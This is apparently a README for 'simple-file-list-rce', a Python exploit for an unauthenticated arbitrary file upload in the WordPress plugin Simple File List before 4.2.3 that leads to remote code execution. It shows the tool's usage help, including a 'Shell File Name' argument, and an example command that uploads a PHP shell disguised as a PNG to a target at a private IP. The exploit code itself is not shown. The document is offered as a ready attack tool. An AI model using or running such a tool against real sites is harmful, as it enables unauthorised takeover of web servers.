# simple-file-list-rce
Simple File List &lt; 4.2.3 - Unauthenticated Arbitrary File Upload RCE

```
usage: simple.py [-h] -u URL [-f1 FILE1] [-f2 FILE2] [-p PATH]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Wordpress Url i.e https://wordpress.lan
  -f1 FILE1, --file1 FILE1
                        Harmless File Name
  -f2 FILE2, --file2 FILE2
                        Shell File Name
  -p PATH, --path PATH  URI Path /my-simple-file-list-page/
```


### Example

```
python3 simple.py --url http://192.168.1.134 -f1 test5.png -f2 test5.php
```
